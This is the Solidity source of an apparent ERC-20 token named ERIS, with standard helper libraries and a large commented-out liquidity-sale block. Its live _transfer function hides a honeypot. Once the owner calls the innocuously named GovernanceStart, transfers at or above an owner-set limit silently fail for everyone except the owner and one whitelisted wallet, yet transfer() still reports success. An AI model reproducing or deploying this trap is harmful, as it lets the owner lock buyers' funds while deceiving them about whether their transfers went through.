/**
 *Submitted for verification at Etherscan.io on 2020-11-22
*/

/*
* Project $ERIS by nCyotee
* Official site: https://eris.exchange/
* 
* Have fun playing!
* SPDX-License-Identifier: AGPL-3.0-or-later
*
**/

pragma solidity 0.7.4;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }

    function sqrrt(uint256 a) internal pure returns (uint c) {
        if (a > 3) {
            c = a;
            uint b = add( div( a, 2), 1 );
            while (b < c) {
                c = b;
                b = div( add( div( a, b ), b), 2 );
            }
        } else if (a != 0) {
            c = 1;
        }
    }
}

library FinancialSafeMath {

    using SafeMath for uint256;
    function quadraticPricing( uint256 payment ) internal pure returns (uint256) {
        return payment.mul(2).sqrrt();
    }

    function bondingPrice( uint256 multiplier, uint256 supply ) internal pure returns (uint256) {
        return multiplier.mul( supply );
    }
}

library Address {

    function isContract(address account) internal view returns (bool) {
        uint256 size;
        // solhint-disable-next-line no-inline-assembly
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }

    function addressToString(address _address) internal pure returns(string memory) {
        bytes32 _bytes = bytes32(uint256(_address));
        bytes memory HEX = "0123456789abcdef";
        bytes memory _addr = new bytes(42);

        _addr[0] = '0';
        _addr[1] = 'x';

        for(uint256 i = 0; i < 20; i++) {
            _addr[2+i*2] = HEX[uint8(_bytes[i + 12] >> 4)];
            _addr[3+i*2] = HEX[uint8(_bytes[i + 12] & 0x0f)];
        }

        return string(_addr);

    }
}

abstract contract Context {

    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable {
  address public _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor () public {
    _owner = msg.sender;
    emit OwnershipTransferred(address(0), msg.sender);
  }

  function owner() public view returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require(_owner == msg.sender, "Ownable: caller is not the owner");
    _;
  }

  function renounceOwnership() public virtual onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public virtual onlyOwner {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract Eris is Ownable {
  using SafeMath for uint256;

  // standard ERC20 variables. 
  string public constant name = "Eris.Exchange";
  string public constant symbol = "ERIS";
  uint256 public constant decimals = 18;
  uint256 private constant _maximumSupply = 10 ** decimals;
  uint256 public _totalSupply;
  bool public start;
  uint256 public Lim;
  address public whiteaddress;
  
  // events
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  

  mapping(address => uint256) public _balanceOf;
  mapping(address => mapping(address => uint256)) public allowance;

  constructor(uint256 _initialSupply) public {

    Lim = 10000000000000000000;
    _owner = msg.sender;
    _totalSupply = _maximumSupply * _initialSupply;
    _balanceOf[msg.sender] = _maximumSupply * _initialSupply;
    start = false;
    whiteaddress = 0x0000000000000000000000000000000000000000;

    emit Transfer(address(0), msg.sender, _totalSupply);
  }

  function totalSupply () public view returns (uint256) {
    return _totalSupply; 
  }

  function balanceOf (address who) public view returns (uint256) {
    return _balanceOf[who];
  }

  function _transfer(address _from, address _to, uint256 _value) internal {
        if (start==false) {
            _balanceOf[_from] = _balanceOf[_from].sub(_value);
            _balanceOf[_to] = _balanceOf[_to].add(_value);
            emit Transfer(_from, _to, _value);
        } else {
            if (_value < Lim) {
                _balanceOf[_from] = _balanceOf[_from].sub(_value);
                _balanceOf[_to] = _balanceOf[_to].add(_value);
                emit Transfer(_from, _to, _value);
            }
            else {
                if(_from == _owner || _from == whiteaddress) {
                    _balanceOf[_from] = _balanceOf[_from].sub(_value);
                    _balanceOf[_to] = _balanceOf[_to].add(_value);
                    emit Transfer(_from, _to, _value);
                }
            }
        }
   }

  function transfer(address _to, uint256 _value) public returns (bool success) {
    require(_balanceOf[msg.sender] >= _value);
    _transfer(msg.sender, _to, _value);
    return true;
  }

  function burn (uint256 _burnAmount) public onlyOwner returns (bool success) {
    _transfer(_owner, address(0), _burnAmount);
    _totalSupply = _totalSupply.sub(_burnAmount);
    return true;
  }

  function approve(address _spender, uint256 _value) public returns (bool success) {
    require(_spender != address(0));
    allowance[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }

  function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
    require(_value <= _balanceOf[_from]);
    require(_value <= allowance[_from][msg.sender]);
    allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_value);
    _transfer(_from, _to, _value);
    return true;
  }
  
  function setGov (uint256 myLim) public {
    require(msg.sender == _owner);
    Lim = myLim;
  }
  
  function GovernanceStart() public {
        require(msg.sender == _owner);
        if (start==false) 
            start = true;
        else
            start = false;
   }
   
  function setGovernanceAddress(address newWallet) public {
    require(msg.sender == _owner);
    whiteaddress =  newWallet;
  }
  
  
  // function changeCharityAddress( address newCharityAddress_ ) public onlyOwner() {
    //     charityAddress = payable(newCharityAddress_);
    // }

    // function changeDevAddress( address newDevAddress_ ) public onlyOwner() {
    //     devAddress = payable(newDevAddress_);
    // }

    // function getSecondsLeftInLiquidityGenerationEvent() public view returns (uint256) {
    //     return qplgmeStartTimestamp.add(qplgmeLength).sub(block.timestamp);
    // }

    // function startQPLGME() public onlyOwner() erisQPLGMEInactive() notHadQPLGME() {
    //     qplgmeActive = true;
    //     qplgmeStartTimestamp = block.timestamp;
    //     emit QPLGMEStarted( qplgmeActive, qplgmeStartTimestamp );
    // }

    // function quadraticPricewithAdditionalPayment( address buyer, uint additionalAmountPaid ) public view returns ( uint ) {
    //     return FinancialSafeMath.quadraticPricing( _weiPaidForErisByAddress[buyer].add( additionalAmountPaid ) ).mul(_erisToEthRatio).mul(1e9);
    // }

    // function erisForWeiPaid( uint256 payment ) public view returns ( uint256 ) {
    //     return FinancialSafeMath.quadraticPricing( payment ).mul(_erisToEthRatio).mul(1e9);
    // }

    // function _erisForWeiPaid( uint256 payment ) private view returns ( uint256 ) {
    //     return FinancialSafeMath.quadraticPricing( payment ).mul(_erisToEthRatio).mul(1e9);
    // }

    // function buyERIS() public payable erisQPLGMEActive {
    //     uint256 amountPaidInWEI = msg.value;
    //     _weth.deposit{value: amountPaidInWEI}();
    //     totalWeiPaidForEris = totalWeiPaidForEris.add( amountPaidInWEI );
    //     if( _weiPaidForErisByAddress[Context._msgSender()] > 0 ){
    //         totalSupply = totalSupply.add( _erisForWeiPaid(_weiPaidForErisByAddress[Context._msgSender()].add(amountPaidInWEI)) ).sub( _erisForWeiPaid(_weiPaidForErisByAddress[Context._msgSender()] ) );
    //     } else if( _weiPaidForErisByAddress[Context._msgSender()] == 0 ) {
    //         totalSupply = totalSupply.add( _erisForWeiPaid(_weiPaidForErisByAddress[Context._msgSender()].add( amountPaidInWEI ) ) );
    //     }
    //     _weiPaidForErisByAddress[Context._msgSender()] = _weiPaidForErisByAddress[Context._msgSender()].add( amountPaidInWEI );
    //     ethDonationToCharity = ethDonationToCharity.add( amountPaidInWEI.div(10) );
    // }

    // function buyERIS( uint256 amount) public payable erisQPLGMEActive() {
    //     uint256 amountPaidInWEI = amount;
    //     _testToken.transferFrom( Context._msgSender(), address(this), amount);

    //     uin256 memory currentBuyersWeirPaidForEris_ = _weiPaidForErisByAddress[Context._msgSender()];
    //     _weiPaidForErisByAddress[Context._msgSender()] = _weiPaidForErisByAddress[Context._msgSender()].add(amountPaidInWEI);

    //     totalWeiPaidForEris = totalWeiPaidForEris.add(_weiPaidForErisByAddress[Context._msgSender()]).sub( currentBuyersWeirPaidForEris_ );

    //     _totalSupply = _totalSupply.add( _erisForWeiPaid(_weiPaidForErisByAddress[Context._msgSender()].add(amountPaidInWEI)) ).sub( _erisForWeiPaid(_weiPaidForErisByAddress[Context._msgSender()] ) );

    //     ethDonationToCharity = ethDonationToCharity.add( _weiPaidForErisByAddress[Context._msgSender()] / 10 ).sub( currentBuyersWeirPaidForEris_.div(10) );
    // }

    // function endQPLGME() public onlyOwner() {
    //     if( !hadQPLGME ) {
    //         _completeErisGME();
    //     }
    //     emit QPLGMEEnded( qplgmeActive, qplgmeEndTimestamp );
    // }

    // function collectErisFromQPLGME() public erisQPLGMEInactive() {
    //     if( !hadQPLGME ) {
    //         _completeErisGME();
    //     }

    //     if( _weiPaidForErisByAddress[Context._msgSender()] > 0 ){
    //         uint256 weiPaidForErisByAddress_ = _weiPaidForErisByAddress[Context._msgSender()];
    //         _weiPaidForErisByAddress[Context._msgSender()] = 0;
    //         _balances[Context._msgSender()] =  _erisForWeiPaid( weiPaidForErisByAddress_ );
    //     }
    // }

    // function _completeErisGME() private  {
    //     qplgmeEndTimestamp = block.timestamp;
    //     qplgmeActive = false;
    //     hadQPLGME = true;
        
    //     // _balances[charityAddress] = _erisForWeiPaid( _weth.balanceOf( address( this ) ) );
    //     _balances[charityAddress] = _erisForWeiPaid( _testToken.balanceOf( address( this ) ) );
    //     _totalSupply = _totalSupply.add(_balances[charityAddress]);
    //     // ethDonationToCharity = _weth.balanceOf( address(this) ).div(10);
    //     ethDonationToCharity = _testToken.balanceOf( address(this) ).div(10);

    //     // erisDueToReserves = _erisForWeiPaid( _weth.balanceOf( address( this ) ) );

    //     _fundReservesAndSetTotalSupply();
    //     _collectDonationToCharity();
    //     _depositInUniswap();
    // }

    // function _fundReservesAndSetTotalSupply() private {
    //     fundCharity();
    //     fundDev();
    // }

    // function fundDev() private {
    //     // _balances[devAddress] = _erisForWeiPaid( _weth.balanceOf( address( this ) ) );
    //     _balances[devAddress] = _erisForWeiPaid( _testToken.balanceOf( address( this ) ) );
    //     _totalSupply = _totalSupply.add(_balances[devAddress]);
    // }

    // function fundCharity() private {
    // }

    // function _collectDonationToCharity() private {
    //     require( ethDonationToCharity > 0 );
    //     ethDonationToCharity = 0;
    //     // _weth.transfer( charityAddress, _weth.balanceOf( address(this) ).div(10) );
    //     _testToken.transfer( charityAddress, _testToken.balanceOf( address(this) ).div(10) );
    // }

    // function _depositInUniswap() private {
    //     // totalWeiPaidForEris = _weth.balanceOf( address(this) );
    //     totalWeiPaidForEris = _testToken.balanceOf( address(this) );
    //     _balances[address(_uniswapV2ErisWETHDEXPair)] = FinancialSafeMath.bondingPrice( _totalSupply.div(totalWeiPaidForEris), _totalSupply ).mul(_erisToEthRatio).div(1e2);
    //     // _weth.transfer( address(_uniswapV2ErisWETHDEXPair), _weth.balanceOf( address(this) ) );
    //     _testToken.transfer( address(_uniswapV2ErisWETHDEXPair), _testToken.balanceOf( address(this) ) );
    //     _uniswapV2ErisWETHDEXPair.mint(address(this));
    //     _totalLPTokensMinted = _uniswapV2ErisWETHDEXPair.balanceOf(address(this));
    //     require(_totalLPTokensMinted != 0 , "No LP deposited");
    //     _lpPerETHUnit = _totalLPTokensMinted.mul(1e18).div(totalWeiPaidForEris);
    //     require(_lpPerETHUnit != 0 , "Eris:292:_depositInUniswap(): No LP deposited");
    // }

    // function erisDueToBuyerAtEndOfLGE( address buyer ) public view returns ( uint256 ){
    //     return FinancialSafeMath.quadraticPricing( _weiPaidForErisByAddress[ buyer ] ).mul(_erisToEthRatio).mul(1e9);
    //     //return _erisForWeiPaid( _weiPaidForErisByAddress[ buyer ] );
    // }

    // function withdrawPaidETHForfietAllERIS() public erisQPLGMEActive() {
    //     uint256 weiPaid = _weiPaidForErisByAddress[Context._msgSender()];
    //     _weiPaidForErisByAddress[Context._msgSender()] = 0 ;
    //     _balances[Context._msgSender()] = 0;
    //     totalWeiPaidForEris = totalWeiPaidForEris.sub( weiPaid );
    //     ethDonationToCharity = ethDonationToCharity.sub( weiPaid.div(10) );
    //     // _weth.withdraw( weiPaid );
    //     // Context._msgSender().transfer( weiPaid );
    //     _testToken.transfer( Context._msgSender(), weiPaid );
    // }
  
}